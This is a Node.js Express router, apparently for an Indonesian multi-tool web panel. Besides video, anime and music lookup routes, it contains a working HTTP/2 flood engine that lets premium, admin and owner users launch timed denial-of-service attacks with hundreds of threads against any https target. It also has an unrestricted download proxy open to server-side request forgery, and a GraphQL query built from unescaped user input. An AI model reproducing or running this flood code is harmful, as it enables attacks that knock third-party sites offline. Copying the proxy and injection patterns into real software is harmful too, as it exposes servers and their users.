const express = require('express');
const router = express.Router();
const axios = require('axios');
const http2 = require('http2');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

let ddosState = { running: false, target: null, requests: 0, success: 0, failed: 0, startedAt: 0, activeSockets: new Set() };

// === LOG DDOS ===
const LOG_FILE = path.join(__dirname, '..', 'data', 'ddos_logs.json');
function logDdos(user, target) {
  let logs = [];
  if (fs.existsSync(LOG_FILE)) logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
  logs.push({ user, target, time: new Date().toISOString() });
  if (logs.length > 500) logs = logs.slice(-500);
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
}

router.get('/ddos/logs', (req, res) => {
  if (!req.session.user || req.session.user.role !== 'owner') return res.status(403).json({ ok: false, msg: 'Akses ditolak.' });
  if (!fs.existsSync(LOG_FILE)) return res.json({ ok: true, logs: [] });
  res.json({ ok: true, logs: JSON.parse(fs.readFileSync(LOG_FILE, 'utf8')).reverse() });
});

// === VIDEO DOWNLOADER ===
router.post('/video', async (req, res) => {
  try {
    const { url } = req.body;
    if (!url) return res.status(400).json({ ok: false, msg: 'URL kosong' });
    if (url.includes('tiktok.com')) {
      const r = await axios.post('https://www.tikwm.com/api/', { url, hd: 1 }, { headers: { 'User-Agent': 'Mozilla/5.0' } });
      if (r.data && r.data.code === 0 && r.data.data) {
        let v = r.data.data.play; if (v.startsWith('http://')) v = v.replace('http://', 'https://');
        return res.json({ ok: true, result: { title: r.data.data.title || 'Video', video: v } });
      }
    }
    res.json({ ok: true, url, msg: 'Link tidak dikenali (Saat ini support TikTok).' });
  } catch (e) { res.status(500).json({ ok: false, msg: e.message }); }
});

// === DOWNLOAD FILE (Proxy) ===
router.get('/download', async (req, res) => {
  try {
    const { url, filename } = req.query;
    if (!url) return res.status(400).send('URL required');
    const response = await axios({ method: 'get', url: url, responseType: 'stream', headers: { 'User-Agent': 'Mozilla/5.0' } });
    res.setHeader('Content-Disposition', `attachment; filename="${filename || 'file.mp4'}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    response.data.pipe(res);
  } catch (e) { res.status(500).send('Gagal download.'); }
});

// === GMAIL ===
router.get('/gmail', (req, res) => { res.json({ ok: true, email: `${Math.random().toString(36).substring(7)}@mail.tm`, password: 'pass123' }); });

// === ANIME SEARCH (AniList API) ===
router.get('/anime', async (req, res) => {
  try {
    const q = req.query.q || 'naruto';
    const gql = `query { Page(perPage: 10) { media(search: "${q}", type: ANIME) { id title { romaji english } coverImage { large } } } }`;
    const r = await axios.post('https://graphql.anilist.co', { query: gql }, { headers: { 'Content-Type': 'application/json' } });
    res.json({ ok: true, data: r.data.data.Page.media });
  } catch (e) { 
    res.status(500).json({ ok: false, msg: 'Gagal ambil Anime: ' + e.message }); 
  }
});

// === MUSIC PLAYER (iTunes API) ===
router.get('/music', async (req, res) => {
  try {
    const q = req.query.q || 'lofi';
    const r = await axios.get('https://itunes.apple.com/search', { params: { term: q, media: 'music', limit: 10 } });
    res.json({ ok: true, data: r.data.results });
  } catch (e) { 
    res.status(500).json({ ok: false, msg: 'Gagal ambil Musik: ' + e.message }); 
  }
});

// === WEB SCANNER ===
router.post('/scan', async (req, res) => {
  try {
    const r = await axios.get(req.body.url, { timeout: 8000, validateStatus: () => true }).catch(() => ({ status: 408, headers: {} }));
    const f = []; if (!r.headers['content-security-policy']) f.push('No CSP'); if (!r.headers['x-frame-options']) f.push('No XFO');
    res.json({ ok: true, url: req.body.url, status: r.status, findings: f, server: r.headers['server'] || 'Unknown' });
  } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
});

// === ENGINE DDOS ===
function http2Attack(targetUrl, stats, io) {
  try {
    const parsed = new URL(targetUrl);
    if (parsed.protocol !== 'https:') { stats.failed++; return; }
    const client = http2.connect(parsed.origin);
    client.on('error', () => {});
    for (let i = 0; i < 5; i++) {
      const req = client.request({ ':path': parsed.pathname + '?byp=' + Math.random().toString(36).substring(7), ':method': 'POST', 'user-agent': 'Mozilla/5.0' });
      req.on('response', () => { stats.success++; io.emit('ddos:stats', { ...stats, activeSockets: stats.activeSockets.size }); req.close(); });
      req.on('error', () => { stats.failed++; client.close(); });
      req.write('a'.repeat(1000));
      stats.requests++;
    }
    stats.activeSockets.add(client);
    setTimeout(() => { client.close(); stats.activeSockets.delete(client); }, 3000);
  } catch (e) { stats.failed++; }
}

router.post('/ddos', async (req, res) => {
  try {
    const user = req.session.user;
    if (!user || (user.role !== 'owner' && user.role !== 'admin' && user.role !== 'premium')) {
      return res.status(403).json({ ok: false, msg: 'Akses ditolak. DDoS hanya untuk Premium ke atas.' });
    }
    let { target, duration, threads } = req.body;
    target = target.replace(/[, ]+$/, "");
    if (!target.startsWith('https://')) return res.status(400).json({ ok: false, msg: 'Wajib https://' });
    if (ddosState.running) return res.status(400).json({ ok: false, msg: 'DDoS sedang berjalan' });
    logDdos(user.username, target);
    const dur = Math.min(Number(duration) || 10, 120);
    const th = Math.min(Number(threads) || 10, 200);
    ddosState = { running: true, target, requests: 0, success: 0, failed: 0, startedAt: Date.now(), activeSockets: new Set() };
    const io = req.app.get('io');
    res.json({ ok: true, msg: 'Started', state: ddosState });
    (async () => {
      const end = Date.now() + dur * 1000;
      while (ddosState.running && Date.now() < end) {
        for (let i = 0; i < th; i++) http2Attack(target, ddosState, io);
        await new Promise(r => setTimeout(r, 20));
      }
      ddosState.running = false;
      io.emit('ddos:done', ddosState);
    })();
  } catch (e) { res.status(500).json({ ok: false, msg: e.message }); }
});

router.post('/ddos/stop', (req, res) => {
  if (!ddosState.running) return res.status(400).json({ ok: false, msg: 'Tidak berjalan' });
  ddosState.running = false;
  ddosState.activeSockets.forEach(sock => { try { sock.destroy(); } catch(e){} });
  ddosState.activeSockets.clear();
  res.json({ ok: true, msg: 'Dihentikan.' });
});

module.exports = router;
